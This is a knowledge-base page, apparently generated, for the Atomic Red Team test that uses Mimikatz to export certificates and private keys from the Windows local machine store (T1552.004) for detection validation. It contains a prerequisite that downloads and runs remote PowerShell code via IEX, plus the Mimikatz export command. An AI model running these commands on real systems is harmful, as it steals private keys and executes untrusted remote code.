---
atomic_guid: "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86"
title: "Export Certificates with Mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.004"
attack_technique_name: "Unsecured Credentials: Private Keys"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86"
  - "Export Certificates with Mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Export Certificates with Mimikatz

The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
A successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.

## Metadata

- Atomic GUID: 290df60e-4b5d-4a5e-b0c7-dc5348ea0c86
- Technique: T1552.004: Unsecured Credentials: Private Keys
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1552.004/T1552.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials|T1552.004]]

## Input Arguments

### mimikatz_exe

- description: Path of the Mimikatz binary
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe

## Dependencies

Mimikatz must exist on disk at specified location (#{mimikatz_exe})

### Prerequisite Check

```text
if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$basePath = Split-Path "#{mimikatz_exe}" | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
"#{mimikatz_exe}" "crypto::certificates /systemstore:local_machine /store:my /export"  exit
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.yaml)
